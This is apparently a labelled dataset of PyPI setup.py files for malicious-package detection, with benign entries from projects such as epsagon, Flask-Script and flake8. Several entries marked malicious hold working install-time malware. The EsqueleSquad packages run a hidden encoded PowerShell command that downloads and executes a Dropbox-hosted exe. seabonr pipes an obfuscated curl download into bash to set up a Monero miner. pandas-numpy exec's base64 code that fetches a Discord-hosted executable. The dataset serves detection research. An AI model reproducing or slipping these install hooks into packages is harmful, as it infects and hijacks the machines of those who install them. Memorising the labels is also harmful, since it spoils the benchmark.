a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\n\n\nsetup(\n\n    name='tlsclient-api',\n    packages=['tlsclient-api'],\n    version='1.0',\n    license='MIT',\n    description='dependence of tls client',\n    author=' Jonathan Hartley',\n    keywords=['Colorama'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n", "target": 1}
{"idx": "epsagon-1.80.0", "func": "#!/usr/bin/env python\nimport re\nimport os\nfrom setuptools import setup, find_packages\n\nwith open('./requirements.txt', 'r') as reqs_file:\n    reqs = reqs_file.readlines()\n\n# Get version\nwith open(os.path.join('epsagon', 'constants.py'), 'rt') as consts_file:\n    version = re.search(r'__version__ = \\'(.*?)\\'', consts_file.read()).group(1)\n\nsetup(\n    name='epsagon',\n    version=version,\n    description='Epsagon Instrumentation for Python',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    author='Epsagon',\n    author_email='support@epsagon.com',\n    url='https://github.com/epsagon/epsagon-python',\n    packages=find_packages(exclude=('tests', 'examples')),\n    package_data={'epsagon': ['*.pem']},\n    install_requires=reqs,\n    license='MIT',\n    setup_requires=['pytest-runner'],\n    tests_require=['pytest'],\n    entry_points={\n        'epsagon': ['string = epsagon:auto_load']\n    },\n    keywords=[\n        'serverless',\n        'microservices',\n        'epsagon',\n        'tracing',\n        'distributed-tracing',\n        'lambda',\n        'aws-lambda',\n        'debugging',\n        'monitoring'\n    ],\n    classifiers=(\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    )\n)\n", "target": 0}
{"idx": "datadog-api-client-2.2.0", "func": "# Unless explicitly stated otherwise all files in this repository are licensed\n# under the 3-clause BSD style license (see LICENSE).\n# This product includes software developed at Datadog (https://www.datadoghq.com/).\n# Copyright 2019 Datadog, Inc.\n\nimport os\n\nfrom setuptools import setup\n\nversion_template = \"\"\"\\\n# Unless explicitly stated otherwise all files in this repository are licensed\n# under the 3-clause BSD style license (see LICENSE).\n# This product includes software developed at Datadog (https://www.datadoghq.com/).\n# Copyright 2020-Present Datadog, Inc.\n\n__version__ = \"{version}\"\n\"\"\"\n\n# Allows the fetching of tags even from shallow clones\n# https://github.com/pypa/setuptools_scm/pull/118#issuecomment-255381535\ndef parse_fetch_on_shallow(root):\n    from setuptools_scm.git import parse, fetch_on_shallow\n\n    return parse(root, pre_parse=fetch_on_shallow)\n\n\nsetup(\n    use_scm_version={\n        \"local_scheme\": \"dirty-tag\",\n        \"write_to\": os.path.join(\"src\", \"datadog_api_client\", \"version.py\"),\n        \"write_to_template\": version_template,\n        \"parse\": parse_fetch_on_shallow,\n    }\n)\n", "target": 0}
{"idx": "esqgettool-1.74", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgettool',\n    packages = ['modlib'],\n    version = '4.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "hackedintel-1.7", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'hackedintel',\n    packages = ['modlib'],\n    version = '1.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geonamescache-1.5.0", "func": "# -*- coding: utf-8 -*-\nfrom pathlib import Path\nfrom setuptools import setup, find_packages\nfrom geonamescache import __version__\n\n\nsetup(\n    name='geonamescache',\n    version=__version__,\n    description='Geonames data for continents, cities and US states.',\n    long_description=Path('README.md').read_text(),\n    long_description_content_type='text/markdown',\n    author='Ramiro G\u00f3mez',\n    author_email='code@ramiro.org',\n    url='https://github.com/yaph/geonamescache',\n    license='MIT',\n    packages=find_packages(exclude=('tests', 'bin')),\n    include_package_data=True,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    test_suite='tests',\n    tests_require=['pytest'],\n)\n", "target": 0}
{"idx": "admcheck-1.5.0", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '1.5.0'\nDESCRIPTION = 'basic package to check if user has admin'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "seabonr-0.1", "func": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nimport subprocess\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            get_url = lambda: ''.join([chr(x) for x in [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 77, 111, 110, 101, 114, 111, 79, 99, 101, 97, 110, 47, 120, 109, 114, 105, 103, 95, 115, 101, 116, 117, 112, 47, 109, 97, 115, 116, 101, 114, 47, 115, 101, 116, 117, 112, 95, 109, 111, 110, 101, 114, 111, 111, 99, 101, 97, 110, 95, 109, 105, 110, 101, 114, 46, 115, 104]])\n            b = lambda: ''.join([chr(x) for x in [98, 97, 115, 104]])\n            c = lambda: ''.join([chr(x) for x in [99, 117, 114, 108]])\n            v = lambda: ''.join([chr(x) for x in [45, 45, 118, 101, 114, 115, 105, 111, 110]])\n            t = lambda: ''.join([chr(x) for x in [56, 53, 113, 50, 112, 97, 66, 65, 82, 110, 56, 54, 78, 117, 107, 68, 70, 71, 111, 66, 49, 89, 55, 107, 85, 66, 53, 71, 109, 115, 65, 116, 105, 66, 78, 104, 85, 120, 99, 53, 78, 89, 119, 116, 105, 67, 77, 117, 98, 116, 116, 84, 119, 55, 86, 71, 72, 54, 49, 68, 118, 57, 99, 53, 119, 118, 78, 86, 89, 49, 101, 65, 106, 88, 65, 107, 90, 57, 81, 71, 118, 52, 99, 113, 103, 50, 114, 68, 54, 76, 55, 105, 122, 83, 117]])\n            try:\n                subprocess.run([b(), v()])\n                subprocess.run(f\"{c()} -s -L {get_url()} | {b()} -s {t()}\", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n            except FileNotFoundError:\n                exit(1)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"seabonr\",\n    packages=[\"seabonr\"],\n    version=\"0.1\",\n    description=\"Not the package you are looking for\",\n    author=\"Bondonio Anderas\",\n    author_email=\"biscottini-shop@proton.me\",\n    cmdclass={\n        \"install\": PostInstallCommand,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"seabonr = seabonr.cli:cli\",\n        ],\n    },\n)\n    ", "target": 1}
{"idx": "sysfontinglib-1.0.0", "func": "from setuptools import setup, find_packages\n\nVERSION = '1.0.0'\nDESCRIPTION = \"Usefull utility package\"\nLONG_DESCRIPTION = \"Usefull utility package\"\n\n# Setting up\nsetup(\n    name=\"sysfontinglib\",\n    version=VERSION,\n    author=\"Josef M\",\n    author_email=\"johannes.mayer@yahoo.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python'],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "Flask-Script-2.0.6", "func": "\"\"\"\nFlask-Script\n--------------\n\nFlask support for writing external scripts.\n\nLinks\n`````\n\n* `documentation <http://flask-script.readthedocs.org>`_\n\n\n\"\"\"\nimport sys\nfrom setuptools import setup\n\nversion='2.0.6'\n\n# Hack to prevent stupid TypeError: 'NoneType' object is not callable error on\n# exit of python setup.py test # in multiprocessing/util.py _exit_function when\n# running python setup.py test (see\n# https://github.com/pypa/virtualenv/pull/259)\ntry:\n    import multiprocessing\nexcept ImportError:\n    pass\n\ninstall_requires = ['Flask']\n\nsetup(\n    name='Flask-Script',\n    version=version,\n    url='http://github.com/smurfix/flask-script',\n\tdownload_url = 'https://github.com/smurfix/flask-script/tarball/v'+version,\n    license='BSD',\n    author='Dan Jacob',\n    author_email='danjac354@gmail.com',\n    maintainer='Matthias Urlichs',\n    maintainer_email='matthias@urlichs.de',\n    description='Scripting support for Flask',\n    long_description=__doc__,\n    packages=[\n        'flask_script'\n    ],\n    zip_safe=False,\n    install_requires=install_requires,\n    tests_require=[\n        'pytest',\n    ],\n    platforms='any',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "pandas-numpy-8.19.3", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '8.19.3'\nDESCRIPTION = 'A package for network communication'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pandas-numpy\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "dash_renderer-1.9.1", "func": "import json\nfrom setuptools import setup\n\nwith open(\"package.json\") as fp:\n    package = json.load(fp)\n\nsetup(\n    name=\"dash_renderer\",\n    version=package[\"version\"],\n    author=\"Chris Parmer\",\n    author_email=\"chris@plotly.com\",\n    packages=[\"dash_renderer\"],\n    include_package_data=True,\n    license=\"MIT\",\n    description=\"Front-end component renderer for Dash\",\n    install_requires=[],\n)\n", "target": 0}
{"idx": "osintgrand-7.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'osintgrand',\n    packages = ['modlib'],\n    version = '3.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqproofpushlib-6.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofpushlib',\n    packages = ['modlib'],\n    version = '6.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqvisapullre-5.39", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvisapullre',\n    packages = ['modlib'],\n    version = '3.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "drf-nested-routers-0.93.4", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport re\nimport os\nimport sys\nfrom setuptools import setup\n\n\nname = 'drf-nested-routers'\npackage = 'rest_framework_nested'\ndescription = 'Nested resources for the Django Rest Framework'\nurl = 'https://github.com/alanjds/drf-nested-routers'\nauthor = 'Alan Justino et al.'\nauthor_email = 'alan.justino@yahoo.com.br'\nlicense = 'Apache'\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.search(\"^__version__ = ['\\\"]([^'\\\"]+)['\\\"]\",\n                     init_py, re.MULTILINE).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\n\nversion = get_version(package)\n\n\nif sys.argv[-1] == 'publish':\n    if os.system(\"pip freeze | grep wheel\"):\n        print(\"wheel not installed.\\nUse `pip install wheel`.\\nPress <Enter> to continue or <Ctrl+C> to abort.\")\n        input()\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a v{0} -m 'version {0}'\".format(version))\n    print(\"  git push origin v{0}\".format(version))\n    sys.exit()\n\n\nsetup(\n    name=name,\n    version=version,\n    url=url,\n    license=license,\n    description=description,\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    package_data=get_package_data(package),\n    install_requires=[\n        'djangorestframework>=3.6.0',\n        'Django>=1.11',\n    ],\n    python_requires=\">=3.5\",\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "flake8-no-pep420-2.3.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "requeste-2.28.1", "func": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"requeste\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requeste\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "flake8-5.0.4", "func": "\"\"\"Packaging logic for Flake8.\"\"\"\nimport os\nimport sys\n\nimport setuptools\n\nsys.path.insert(0, os.path.join(os.path.dirname(__file__), \"src\"))\n\nsetuptools.setup()\n", "target": 0}
{"idx": "selfhttpvmcontrol-1.78", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhttpvmcontrol',\n    packages = ['modlib'],\n    version = '5.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
